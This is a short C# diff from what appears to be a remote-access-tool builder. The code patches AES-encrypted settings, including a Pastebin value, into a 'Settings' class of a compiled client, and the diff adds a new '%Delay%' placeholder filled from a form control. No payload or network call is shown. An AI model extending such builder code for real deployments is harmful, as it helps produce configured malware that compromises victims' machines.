@@ -365,7 +365,7 @@ namespace Server.Forms
 
                 foreach (TypeDef type in asmDef.Types)
                 {
-                    if (type.Name == "Settings")
+                     if (type.Name == "Settings")
                         foreach (MethodDef method in type.Methods)
                         {
                             if (method.Body == null) continue;
@@ -443,6 +443,9 @@ namespace Server.Forms
                                             method.Body.Instructions[i].Operand = aes.Encrypt(txtPastebin.Text);
                                         else
                                             method.Body.Instructions[i].Operand = aes.Encrypt("null");
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%Delay%")
+                                        method.Body.Instructions[i].Operand = numDelay.Value.ToString();
                                 }
                             }
                         }
